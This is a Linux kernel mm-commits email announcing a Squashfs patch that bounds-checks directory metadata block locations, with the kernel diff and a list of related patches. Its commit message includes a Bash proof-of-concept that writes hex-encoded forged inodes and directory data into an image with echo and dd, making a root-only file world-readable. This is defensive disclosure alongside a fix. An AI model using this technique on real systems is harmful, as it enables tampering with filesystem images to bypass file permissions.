Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795586026;
	b=RFOS64hEj5kLAreCDCalcrZzpEpsnLYz4zmuD8iqMeGII/sDuqCBl1G9pbLoC324UpEr
	 1PLYbRX5fqNky6f1Zpf8IuDQOoWJCMaggVlgXRdSbcUFjT+pdF3rTXMCdwpyTwB3iUgwY
	 pl5kr7os4acI+PxCxxOxdpFL/ryybM1S/n7X3bH9Bt3skRwojSm29Qd1LC5gmrvlKqGJk
	 BgjHoM2udBgJZ/lOi0FWMv3Owcwhr0u9sHyqF4Xf6wQivfT+nZ4PCkmwO37Tnh3HmUREf
	 mnXGeRzJZZjOtzikV3W2pKEsP6K4+XNEGM7UgYG7oeT9t7RyhSPmI6ntpbzFW14ASug==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795586026;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=X/4FJD1QelyPdCYn7UAvo7dZE5NZENciBMvxkkRsynE=;
	b=tiuFHDVGNDmx+3dEUqSyMWjTPqFIGaAhYpUbVX3CJ+eLZMFvAwm78oIwaEFF3h7iXGF6
	 TEsmxpn/V1wudvzCoU/U9MbkuhLBKmhA04zCnw0eXoVxB89FAYrRm1qNEpZMnnRM+afPR
	 fPMFsIMSb42ZUPo6Wsxf9Io6CqnPtHUDe2TiXhcMBTpgd7/evpO+Bg4luHLZh2UPq1B0D
	 1czZ6QXCSQG1e+DMK0qtSuqnVLVKnySrzR7RJA0z+wSZ4oOIqQ1+BZ/BXhMo5QW6LU4Xo
	 ceccNRFPoj1SiTp+K/vpqQVpfWImF19QaqpfvlhZUMgqn98W+wbPvim8CjsxSwnDLbA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=k65Q9tBg;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DD1E8606A323
	for <mm-commits@vger.kernel.org>; Wed, 25 Nov 2026 05:53:46 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=k65Q9tBg
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 27C601F000C6;
	Wed, 25 Nov 2026 05:53:46 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795586026;
	bh=X/4FJD1QelyPdCYn7UAvo7dZE5NZENciBMvxkkRsynE=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=k65Q9tBgd0oPNVaYqWDnYGmrDzbzW9KKukzfdj/VX2Qv1hOMI0FI6rcWOSPq1xUia
	 LROC5GgsjVjG7rkvqLaT5E2SpZaeU8+wTQ0b+8BivgEVHHLoG0O0lwjwaqafEiCa/X
	 HkR/yHApTI2xo8i0ZrJEbrGuPD4aEMjkimVp3stA=
Date: Tue, 24 Nov 2026 21:53:45 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261125014737.347231-13-phillip@squashfs.org.uk>
References: <20261125014737.347231-13-phillip@squashfs.org.uk>
Subject: + squashfs-sanity-check-directory-metadata-block-location.patch added to mm-nonmm-unstable branch
Message-Id: <20261125055346.27C601F000C6@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The patch titled
     Subject: Squashfs: sanity check directory metadata block location
has been added to the -mm mm-nonmm-unstable branch.  Its filename is
     squashfs-sanity-check-directory-metadata-block-location.patch

This patch will shortly appear at
     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-sanity-check-directory-metadata-block-location.patch

This patch will later appear in the mm-nonmm-unstable branch at
    git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm

Before you just go and hit "reply", please:
   a) Consider who else should be cc'ed
   b) Prefer to cc a suitable mailing list as well
   c) Ideally: find the original patch on the mailing list and do a
      reply-to-all to that, adding suitable additional cc's

*** Remember to use Documentation/process/submit-checklist.rst when testing your code ***

The -mm tree is included into linux-next via various
branches at git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
and is updated there most days

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: sanity check directory metadata block location
Date: Wed, 25 Nov 2026 01:47:26 +0000

The contents of directories are stored in compressed metadata blocks,
which are placed in the directory table.  The location of a directory
is thus represented as a tuple, the location of the compressed metadata
block that the directory is in, and the offset into the uncompressed
block.  The block location is not absolute, and it is instead encoded
as an offset from the start of the directory table.

An attacker could manipulate the directory block location to make it
point to a replacement malicious directory stored elsewhere, outside
the directory table.  This is because the code does not check that the
location is valid and is within the directory table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to store a malicious directory.

Also anyone with access to Mksquashfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However, there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliverately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem has a file in the
root directory with permissions 0700 (u=rxw), where only the superuser
can read it.  But using this bug an attacker could create a malicious
replacement directory in the inode lookup table (used by NFS), that
points to a malicious replacement inode that has the permissions
changed to 0777 (a=wrx).  On reboot/remount this would make the
file readable by unprivileged users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_dir_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the directory is within the directory table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the file "data"
permissions will be changed to 0777 (a=rwx), but otherwise the
filesystem is unchanged.

===================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
echo "data f 0700 0 0 echo some data" >> pseudo
echo "files d 0777 0 0" >> pseudo
for i in $(seq 1 100); do
	echo "files/$i f 0655 1000 1000 cat zero" >> pseudo
done

# Create a Squashfs filesystem
echo "Create a Squashfs filesystem"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# Exploit: The file named "data" has permissions 0700, which can only be
# read by the superuser.  The desire is to change the permissions on
# the file to be 0777, which can be read by unprivileged users.
#
# Due to compression of the metadata, this cannot be done by directly
# writing to the metadata tables.  Instead the real metadata is replaced
# by malicious metadata starting from the "data" file inode upwards to
# the root inode.
#
# This is a three step process.
#
# 1. A new "data" file inode is placed within the inode lookup table
# 2. A new root directory which points to the new "data" file inode is
#    placed in the inode lookup table
# 3. A new root inode which pounts to the new root directory table is
#    placed in the inode lookup table.
#
# For brevity this reproducer uses pre-computed data for the above.

# Write malicious inode for file "data", this is the same as the
# original except it is uncompressed, and the permissions are set to
# 0777.
echo Writing malicious inode for file \"data\"

/usr/bin/echo -en "\x20\x80\x02\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x0A\x00\x00\x00" > file

dd bs=1 seek=1034 if=file of=img.sqsh count=34 conv=notrunc status=none

# Write directory data which points to the malicious inode
echo Writing root directory which points to malicious inode

/usr/bin/echo -en "\x31\x80\x00\x00\x00\x00\x90\x03\x00\x00\x01\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x03\x00\x64\x61\x74\x61\x00\x00\x00\x00\
\x00\x00\x00\x00\x02\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x04\x00\x66\
\x69\x6c\x65\x73" > file

dd bs=1 seek=983 if=file of=img.sqsh count=51 conv=notrunc status=none

#
# Write root inode, this is the same as the original root inode, except
# it is uncompressed, and it points to the new directory data
echo Writing root inode which points to the new root directory

/usr/bin/echo -en "\x20\x80\x01\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x67\x00\x00\x00\x43\x02\x00\x00\x03\x00\x00\x00\x34\x00\x00\
\x00\x00\x00\x00\x00" > file

dd bs=1 seek=949 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new
# root inode.  The start block is an offset from the inode_table_start,
# and not an absolute value.  The start of the inode table is 122, the
# new inode is placed at position 949, and so the offset is 827. Because
# we've only stored one inode in the metadata block, the offset into
# that block is 0.
echo Updating the root_inode field in the superblock

/usr/bin/echo -en "\x00\x00\x3B\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt/data, if the exploit is successful, permissions should be 0777
echo "************************************************************************"
echo Stat /mnt/data, if the exploit is successful, permissions should be 0777

stat /mnt/data

popd 2>&1> /dev/null

rm -rf $DIR
=====================================================================

Link: https://patch.msgid.link/20261125014737.347231-13-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>

 fs/squashfs/dir.c              |   17 ++++++++++++-----
 fs/squashfs/namei.c            |   16 +++++++++++-----
 fs/squashfs/squashfs_fs_sb.h   |    1 +
 fs/squashfs/squashfs_helpers.h |   16 ++++++++++++++++
 fs/squashfs/super.c            |    1 +
 5 files changed, 41 insertions(+), 10 deletions(-)

--- a/fs/squashfs/dir.c~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/dir.c
@@ -22,6 +22,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
 static const unsigned char squashfs_filetype_table[] = {
@@ -41,6 +42,7 @@ static int get_dir_index_using_offset(st
 	int i_count, u64 f_pos)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int err, i, index, length = 0;
 	unsigned int size;
 	struct squashfs_dir_index dir_index;
@@ -81,9 +83,12 @@ static int get_dir_index_using_offset(st
 		if (err < 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(dir_index.start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = index;
-		*next_block = le32_to_cpu(dir_index.start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -99,7 +104,7 @@ static int squashfs_readdir(struct file
 {
 	struct inode *inode = file_inode(file);
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	u64 block;
+	s64 block;
 	int offset, length, err;
 	unsigned int inode_number, dir_count, size, type;
 	struct squashfs_dir_header dirh;
@@ -141,15 +146,17 @@ static int squashfs_readdir(struct file
 		/* The directory is empty, nothing more to do */
 		goto finish;
 
+	block = squashfs_dir_start(squashfs_i(inode)->start, msblk);
+	if (block < 0)
+		goto failed_read;
+
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
 		ERROR("Failed to allocate squashfs_dir_entry\n");
 		goto finish;
 	}
 
-	block = squashfs_i(inode)->start + msblk->directory_table;
 	offset = squashfs_i(inode)->offset;
-
 	length = get_dir_index_using_offset(inode->i_sb, &block, &offset,
 				squashfs_i(inode)->dir_idx_start,
 				squashfs_i(inode)->dir_idx_offset,
--- a/fs/squashfs/namei.c~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/namei.c
@@ -66,6 +66,7 @@ static int get_dir_index_using_name(stru
 			int index_offset, int i_count, const char *name)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int i, length = 0, err;
 	unsigned int size;
 	struct squashfs_dir_index *index;
@@ -102,9 +103,12 @@ static int get_dir_index_using_name(stru
 		if (strcmp(index->name, name) > 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(index->start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = le32_to_cpu(index->index);
-		*next_block = le32_to_cpu(index->start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -130,7 +134,7 @@ static struct dentry *squashfs_lookup(st
 	struct squashfs_sb_info *msblk = dir->i_sb->s_fs_info;
 	struct squashfs_dir_header dirh;
 	struct squashfs_dir_entry *dire = NULL;
-	u64 block;
+	s64 block;
 	int offset, err, length;
 	unsigned int dir_count, size;
 
@@ -144,15 +148,17 @@ static struct dentry *squashfs_lookup(st
 		/* The directory is empty, and so there's nothing to do */
 		goto exit_lookup;
 
+	block = squashfs_dir_start(squashfs_i(dir)->start, msblk);
+	if (block < 0)
+		goto data_error;
+
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
 		ERROR("Failed to allocate squashfs_dir_entry\n");
 		return ERR_PTR(-ENOMEM);
 	}
 
-	block = squashfs_i(dir)->start + msblk->directory_table;
 	offset = squashfs_i(dir)->offset;
-
 	length = get_dir_index_using_name(dir->i_sb, &block, &offset,
 				squashfs_i(dir)->dir_idx_start,
 				squashfs_i(dir)->dir_idx_offset,
--- a/fs/squashfs/squashfs_fs_sb.h~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/squashfs_fs_sb.h
@@ -67,6 +67,7 @@ struct squashfs_sb_info {
 	__le64					*inode_lookup_table;
 	u64					inode_table;
 	u64					directory_table;
+	u64					directory_table_end;
 	u64					xattr_table;
 	unsigned int				block_size;
 	unsigned short				block_log;
--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/squashfs_helpers.h
@@ -70,6 +70,22 @@ static inline s64 squashfs_mkinode(u32 s
 	return ((s64)start << 16) | offset;
 }
 
+/* directory helper functions */
+static inline s64 squashfs_dir_start(u32 blk, struct squashfs_sb_info *msblk)
+{
+	s64 start;
+
+	if (S64_MAX - msblk->directory_table < blk)
+		return -EINVAL;
+
+	start = msblk->directory_table + blk;
+
+	if (start >= msblk->directory_table_end)
+		return -EINVAL;
+
+	return start;
+}
+
 /* fragment and fragment table defines */
 static inline s64 squashfs_fragment_bytes(u32 fragments)
 {
--- a/fs/squashfs/super.c~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/super.c
@@ -437,6 +437,7 @@ check_directory_table:
 		err = -EINVAL;
 		goto insanity;
 	}
+	msblk->directory_table_end = next_table;
 
 	/* Sanity check inode_table */
 	if (msblk->inode_table >= msblk->directory_table) {
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-convert-squashfs_compressed_-to-inline-functions.patch
squashfs-convert-squashfs_inode_-and-squashfs_mkinode-to-inline-functions.patch
squashfs-convert-squashfs_fragment_-to-inline-functions.patch
squashfs-convert-squashfs_lookup_-to-inline-functions.patch
squashfs-convert-squashfs_id_-to-inline-functions.patch
squashfs-convert-squashfs_xattr_-to-inline-functions.patch
squashfs-fix-offset-in-squashfs_read_inode-trace-statements.patch
squashfs-dont-compute-start-or-alloc-memory-on-empty-directory-or-index.patch
squashfs-fix-fragment-bytes-overflow-on-32-bit-architectures.patch
squashfs-fix-fragment-index-table-length-too-large-exploit.patch
squashfs-sanity-check-inode-metadata-block-location.patch
squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-or-size_t.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

